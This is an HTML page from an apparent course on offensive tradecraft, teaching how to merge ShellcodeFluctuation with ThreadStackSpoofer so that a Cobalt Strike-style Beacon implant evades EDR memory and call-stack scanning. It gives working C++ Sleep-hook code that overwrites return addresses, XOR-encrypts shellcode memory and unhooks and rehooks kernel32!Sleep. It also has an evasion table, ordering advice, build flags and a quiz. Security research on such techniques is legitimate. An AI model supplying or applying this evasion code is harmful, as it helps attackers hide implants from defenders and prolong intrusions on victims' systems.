@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 7: Thread Stack Spoofing Integration - ShellcodeFluctuation Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F4A0;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#10b981;--accent2:#059669;--gradient:linear-gradient(135deg,#10b981,#059669)}</style>
+</head>
+<body>
+
+<button class="hamburger" onclick="document.querySelector('nav').classList.toggle('open')">&#9776;</button>
+<nav>
+  <div class="logo"><h2>ShellcodeFluctuation</h2><span>Memory Fluctuation Masterclass</span></div>
+  <a class="home-link" href="../ShellcodeFluctuation_index.html">&larr; Course Home</a>
+  <a class="mod-link" href="module1.html"><span>1. Memory Scanning Threat Model</span><span class="diff d1">d1</span></a>
+  <a class="mod-link" href="module2.html"><span>2. XOR Encryption for Memory</span><span class="diff d1">d1</span></a>
+  <a class="mod-link" href="module3.html"><span>3. VirtualProtect &amp; Pages</span><span class="diff d1">d1</span></a>
+  <a class="mod-link" href="module4.html"><span>4. Sleep Function Hooking</span><span class="diff d2">d2</span></a>
+  <a class="mod-link" href="module5.html"><span>5. The Fluctuation Algorithm</span><span class="diff d2">d2</span></a>
+  <a class="mod-link" href="module6.html"><span>6. Shellcode Region Tracking</span><span class="diff d2">d2</span></a>
+  <a class="mod-link active" href="module7.html"><span>7. Thread Stack Spoofing</span><span class="diff d3">d3</span></a>
+  <a class="mod-link" href="module8.html"><span>8. Full Chain &amp; Detection</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge hard">Difficulty: Advanced</span>
+<h1>Module 7: Thread Stack Spoofing Integration</h1>
+<p class="subtitle">Combining ShellcodeFluctuation with ThreadStackSpoofer for dual-layer evasion &mdash; encrypted memory AND clean call stacks.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Understand the call stack detection vector that ShellcodeFluctuation alone does not address, how ThreadStackSpoofer (also by mgeeky) overwrites the return address to terminate stack unwinding, how both techniques integrate through their shared Sleep hook architecture, and the combined evasion profile.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. The Call Stack Detection Vector</h2>
+
+<p>Even with ShellcodeFluctuation encrypting memory and removing the Sleep hook during the idle window, one IOC remains: the <strong>thread call stack</strong>. When a thread is sleeping, its call stack reveals the chain of function calls that led to the sleep:</p>
+
+<pre><code class="language-cpp">// Typical call stack of a sleeping Beacon thread WITHOUT stack spoofing:
+//
+// ntdll!NtDelayExecution          <-- kernel wait
+// ntdll!RtlDelayExecution         <-- internal delay
+// KERNELBASE!SleepEx              <-- SleepEx wrapper
+// kernel32!Sleep                  <-- Sleep API
+// 0x000001A0004532                <-- MySleep (in loader memory)
+// 0x000001A00023A8                <-- Beacon shellcode (SUSPICIOUS!)
+// 0x000001A00001C0                <-- Beacon entry point (SUSPICIOUS!)
+// ntdll!RtlUserThreadStart        <-- thread start
+//
+// Frames 0x1A00... point to private, non-image memory
+// This is a strong IOC: legitimate threads have call stacks
+// pointing only to loaded DLLs (image-backed memory)</code></pre>
+
+<div class="card warn">
+<h4>Why This Matters</h4>
+<p>Security tools like Process Hacker, Moneta, and EDR products can walk thread call stacks using <code>StackWalk64</code> or <code>RtlVirtualUnwind</code>. Return addresses pointing to private (non-image) memory are strong indicators of injected code. ShellcodeFluctuation encrypts the memory content, but the return addresses on the stack still point to the shellcode allocation's address range.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>2. ThreadStackSpoofer Concept</h2>
+
+<p>ThreadStackSpoofer (by mgeeky / Mariusz Banach) addresses the call stack IOC by overwriting the return address that traces back to the shellcode with a null value, effectively terminating the stack walk:</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Stack Before vs After Spoofing</h4>
+<div class="flow">
+<div class="flow box">Before<br><small>Stack shows full chain:<br>Sleep &rarr; MySleep &rarr; <strong>Beacon</strong></small></div>
+<div class="flow arrow">spoof &rarr;</div>
+<div class="flow box">After<br><small>Stack terminates early:<br>Sleep &rarr; MySleep &rarr; <strong>0x0</strong></small></div>
+</div>
+</div>
+
+<p>The key mechanism is simple: overwrite the return address of the hook handler frame so that stack unwinding cannot reach the shellcode frames below:</p>
+
+<pre><code class="language-cpp">// ThreadStackSpoofer core mechanism
+void WINAPI MySleep_WithStackSpoof(DWORD dwMilliseconds) {
+    // _AddressOfReturnAddress() returns a pointer to the
+    // return address stored on the stack for THIS function.
+    // This return address points back into the Beacon shellcode.
+    auto overwrite = (PULONG_PTR)_AddressOfReturnAddress();
+
+    // Save the original return address (we need it to get back!)
+    const auto origReturnAddress = *overwrite;
+
+    // Overwrite with 0 - stack unwinding will stop here
+    *overwrite = 0;
+
+    // ... perform Sleep (stack now looks clean) ...
+
+    // Restore original return address before returning
+    *overwrite = origReturnAddress;
+}</code></pre>
+
+<!-- ============================================================ -->
+<h2>3. How _AddressOfReturnAddress Works</h2>
+
+<p><code>_AddressOfReturnAddress()</code> is an MSVC compiler intrinsic that returns a pointer to the location on the stack where the return address is stored for the current function. This is the value that <code>RET</code> will pop when the function returns:</p>
+
+<pre><code class="language-cpp">// Stack layout when MySleep is called:
+//
+// Higher addresses (top of stack diagram)
+// +--------------------------+
+// | Beacon shellcode frame   |  <-- caller of Sleep
+// +--------------------------+
+// | Return addr to Beacon    |  <-- THIS is what _AddressOfReturnAddress points to
+// +--------------------------+
+// | MySleep local variables  |
+// +--------------------------+
+// | Return addr to MySleep   |  <-- for functions MySleep calls
+// +--------------------------+
+// | Sleep/SleepEx frame      |
+// +--------------------------+
+// Lower addresses (bottom of stack)
+//
+// By overwriting "Return addr to Beacon" with 0:
+// Stack walkers see: Sleep -> MySleep -> 0x0 (end)
+// They never see the Beacon frames below</code></pre>
+
+<div class="card green">
+<h4>Why Not Overwrite More Frames?</h4>
+<p>Overwriting just the single return address is sufficient because stack unwinding algorithms (<code>RtlVirtualUnwind</code> on x64) stop when they encounter a null return address or a frame that cannot be unwound. Setting one frame to 0 terminates the entire walk. Additional frames below it are invisible to the scanner.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>4. Integrating Both Techniques</h2>
+
+<p>ShellcodeFluctuation and ThreadStackSpoofer share the same hook point (<code>kernel32!Sleep</code>) and the same author. Combining them is architecturally straightforward &mdash; both sets of operations happen in the same <code>MySleep</code> handler:</p>
+
+<pre><code class="language-cpp">void WINAPI MySleep_Combined(DWORD dwMilliseconds) {
+    // ========================================
+    // STACK SPOOFING: Save and overwrite return address
+    // ========================================
+    auto overwrite = (PULONG_PTR)_AddressOfReturnAddress();
+    const auto origReturnAddress = *overwrite;
+    *overwrite = 0;  // Terminate stack walk
+
+    // ========================================
+    // FLUCTUATION: Encrypt shellcode memory
+    // ========================================
+    DWORD oldProt;
+    VirtualProtect(g_state.shellcodeBase, g_state.shellcodeSize,
+                   PAGE_READWRITE, &oldProt);
+    xor32((BYTE*)g_state.shellcodeBase, g_state.shellcodeSize,
+          g_state.xorKey);
+
+    // ========================================
+    // UNHOOK: Clean kernel32!Sleep
+    // ========================================
+    DWORD hookProt;
+    VirtualProtect(g_state.sleepFunc, g_state.hookSize,
+                   PAGE_EXECUTE_READWRITE, &hookProt);
+    memcpy(g_state.sleepFunc, g_state.originalBytes, g_state.hookSize);
+    VirtualProtect(g_state.sleepFunc, g_state.hookSize,
+                   hookProt, &hookProt);
+
+    // ========================================
+    // SLEEP: Maximum stealth state
+    // ========================================
+    // At this point:
+    //   - Shellcode memory: RW + encrypted (invisible)
+    //   - Call stack: terminates at 0 (no shellcode refs)
+    //   - kernel32!Sleep: unhooked (clean)
+    Sleep(dwMilliseconds);
+
+    // ========================================
+    // REHOOK: Reinstall Sleep interception
+    // ========================================
+    VirtualProtect(g_state.sleepFunc, g_state.hookSize,
+                   PAGE_EXECUTE_READWRITE, &hookProt);
+    memcpy(g_state.sleepFunc, g_state.hookBytes, g_state.hookSize);
+    VirtualProtect(g_state.sleepFunc, g_state.hookSize,
+                   hookProt, &hookProt);
+
+    // ========================================
+    // FLUCTUATION: Decrypt shellcode memory
+    // ========================================
+    xor32((BYTE*)g_state.shellcodeBase, g_state.shellcodeSize,
+          g_state.xorKey);
+    VirtualProtect(g_state.shellcodeBase, g_state.shellcodeSize,
+                   PAGE_EXECUTE_READ, &oldProt);
+
+    // ========================================
+    // STACK RESTORE: Put back original return address
+    // ========================================
+    *overwrite = origReturnAddress;
+
+    // Return to Beacon - execution continues normally
+}</code></pre>
+
+<!-- ============================================================ -->
+<h2>5. Dual-Layer Evasion Profile</h2>
+
+<p>When both techniques are active during the sleep window, the evasion profile is significantly stronger than either technique alone:</p>
+
+<table>
+<tr><th>Detection Vector</th><th>Fluctuation Only</th><th>Stack Spoof Only</th><th>Combined</th></tr>
+<tr><td><strong>Private executable memory</strong></td><td>Evaded (RW during sleep)</td><td>Not addressed</td><td>Evaded</td></tr>
+<tr><td><strong>Shellcode signatures</strong></td><td>Evaded (encrypted)</td><td>Not addressed</td><td>Evaded</td></tr>
+<tr><td><strong>Beacon config patterns</strong></td><td>Evaded (XOR32)</td><td>Not addressed</td><td>Evaded</td></tr>
+<tr><td><strong>Call stack to private memory</strong></td><td>Not addressed</td><td>Evaded (return addr = 0)</td><td>Evaded</td></tr>
+<tr><td><strong>Sleep hook in kernel32</strong></td><td>Evaded (unhook during sleep)</td><td>Not addressed</td><td>Evaded</td></tr>
+<tr><td><strong>Thread start address</strong></td><td>Not addressed</td><td>Not addressed</td><td>Not addressed</td></tr>
+<tr><td><strong>kernel32 private pages (CoW)</strong></td><td>Partially addressed</td><td>Not relevant</td><td>Partially addressed</td></tr>
+</table>
+
+<div class="card highlight">
+<h4>Remaining IOCs</h4>
+<p>Even with both techniques, the thread's <strong>start address</strong> still points to private memory (the <code>CreateThread</code> target). This is a fundamental IOC that cannot be addressed by post-creation techniques. Solutions include starting the thread on a legitimate DLL function and redirecting via APC, or using thread pool callbacks.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>6. Ordering Considerations</h2>
+
+<p>The combined approach has specific ordering requirements for the stack spoofing operations:</p>
+
+<div class="card">
+<h4>Operation Order</h4>
+<ol>
+<li><strong>Spoof stack FIRST</strong> &mdash; overwrite the return address before any operations that might be observed. A scanner running between steps sees a clean stack from the earliest possible moment</li>
+<li><strong>Encrypt shellcode</strong> &mdash; now the memory content is hidden</li>
+<li><strong>Unhook Sleep</strong> &mdash; remove the last easily-visible IOC</li>
+<li><strong>Sleep</strong> &mdash; in the maximally hidden state</li>
+<li><strong>Rehook Sleep</strong> &mdash; prepare for next cycle</li>
+<li><strong>Decrypt shellcode</strong> &mdash; restore executable content</li>
+<li><strong>Restore stack LAST</strong> &mdash; the return address must be valid for the <code>RET</code> instruction</li>
+</ol>
+</div>
+
+<p>Restoring the return address must happen <strong>last</strong>, just before the function returns. If it were restored before decryption, a scanner could briefly see the return address pointing to shellcode memory. If it were never restored, the function would return to address 0 and crash.</p>
+
+<!-- ============================================================ -->
+<h2>7. Advanced Stack Spoofing Considerations</h2>
+
+<p>The basic <code>*overwrite = 0</code> approach has a weakness: a zero return address is itself anomalous. More sophisticated approaches create a fake but plausible call stack:</p>
+
+<pre><code class="language-cpp">// Advanced: Spoof with a plausible return address
+// Instead of 0, use an address inside a legitimate DLL
+
+void WINAPI MySleep_AdvancedSpoof(DWORD dwMilliseconds) {
+    auto overwrite = (PULONG_PTR)_AddressOfReturnAddress();
+    const auto origReturnAddress = *overwrite;
+
+    // Option 1: Use a known-good return address
+    // e.g., inside ntdll!RtlUserThreadStart
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    FARPROC threadStart = GetProcAddress(hNtdll, "RtlUserThreadStart");
+    *overwrite = (ULONG_PTR)threadStart;
+
+    // Now the stack looks like:
+    // Sleep -> MySleep -> RtlUserThreadStart (legitimate!)
+    // This is a common legitimate call chain.
+
+    // ... fluctuation + sleep ...
+
+    *overwrite = origReturnAddress;
+}
+
+// Option 2: Craft a complete fake frame chain
+// This requires understanding x64 unwind metadata and
+// creating synthetic RUNTIME_FUNCTION entries, which is
+// significantly more complex (see SilentMoonwalk, Unwinder)</code></pre>
+
+<div class="card warn">
+<h4>Call Stack Validation</h4>
+<p>Modern EDR solutions are becoming more sophisticated at validating call stacks. They may verify that return addresses correspond to valid <code>CALL</code> instruction targets, check unwind metadata consistency, or compare stacks against known-good patterns. Simple spoofing (setting return to 0 or a random DLL address) may be detected by these advanced techniques. Full call stack fabrication (as in SilentMoonwalk) is significantly more complex but more robust.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>8. Implementation Notes and Caveats</h2>
+
+<div class="card">
+<h4>Practical Considerations</h4>
+<table>
+<tr><th>Topic</th><th>Details</th></tr>
+<tr><td><strong>Compiler optimization</strong></td><td><code>_AddressOfReturnAddress()</code> requires that the function has a standard stack frame. Aggressive inlining or frame pointer omission can break it. Compile with <code>/Oy-</code> (do not omit frame pointers) or use <code>#pragma optimize("", off)</code></td></tr>
+<tr><td><strong>x64 unwind info</strong></td><td>x64 Windows uses table-based exception handling. The stack spoof works because stack walkers rely on return addresses for unwinding. Setting a return address to 0 causes the unwind to terminate gracefully</td></tr>
+<tr><td><strong>Debug builds</strong></td><td>Debug builds add stack cookies and additional frame metadata. Stack spoofing works in both Debug and Release builds, but the stack layout differs</td></tr>
+<tr><td><strong>Thread count</strong></td><td>Both techniques operate per-thread. If the implant spawns worker threads, each thread that calls Sleep will trigger its own fluctuation+spoof cycle</td></tr>
+<tr><td><strong>Non-Sleep waits</strong></td><td>If the implant uses <code>WaitForSingleObject</code> or <code>WaitForMultipleObjects</code> instead of <code>Sleep</code>, those functions would also need to be hooked for complete coverage</td></tr>
+</table>
+</div>
+
+<div class="card green">
+<h4>Same Author, Same Architecture</h4>
+<p>A key advantage of combining ShellcodeFluctuation and ThreadStackSpoofer is that both tools were designed by the same author (mgeeky) with integration in mind. They share the same hooking architecture (inline hook on <code>kernel32!Sleep</code>), the same loader pattern (<code>VirtualAlloc</code> + <code>memcpy</code> + <code>CreateThread</code>), and compatible state management. Merging them into a single <code>MySleep</code> handler is a natural architectural fit.</p>
+</div>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="B">
+<p>Q1: What detection vector does ThreadStackSpoofer address that ShellcodeFluctuation does not?</p>
+<div class="quiz-btn" data-choice="A">A) Executable private memory</div>
+<div class="quiz-btn" data-choice="B">B) Thread call stacks showing return addresses in private (non-image) memory</div>
+<div class="quiz-btn" data-choice="C">C) RWX page permissions</div>
+<div class="quiz-btn" data-choice="D">D) XOR-encrypted memory regions</div>
+</div>
+
+<div class="quiz-q" data-answer="D">
+<p>Q2: How does ThreadStackSpoofer terminate the stack walk?</p>
+<div class="quiz-btn" data-choice="A">A) It deletes all stack frames below the current function</div>
+<div class="quiz-btn" data-choice="B">B) It hooks RtlVirtualUnwind to skip shellcode frames</div>
+<div class="quiz-btn" data-choice="C">C) It moves the thread's stack pointer to a different memory region</div>
+<div class="quiz-btn" data-choice="D">D) It overwrites the return address (pointing to shellcode) with 0, causing the unwinder to stop</div>
+</div>
+
+<div class="quiz-q" data-answer="C">
+<p>Q3: Why must the original return address be restored LAST, just before MySleep returns?</p>
+<div class="quiz-btn" data-choice="A">A) Windows requires a non-zero return address for thread scheduling</div>
+<div class="quiz-btn" data-choice="B">B) The XOR decryption uses the return address as a key</div>
+<div class="quiz-btn" data-choice="C">C) The RET instruction needs the valid return address to transfer control back to the shellcode</div>
+<div class="quiz-btn" data-choice="D">D) The Sleep API checks the return address for validation</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module6.html">&larr; Prev: Shellcode Region Tracking</a>
+<a class="primary" href="module8.html">Next: Full Chain, Detection &amp; Comparison &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
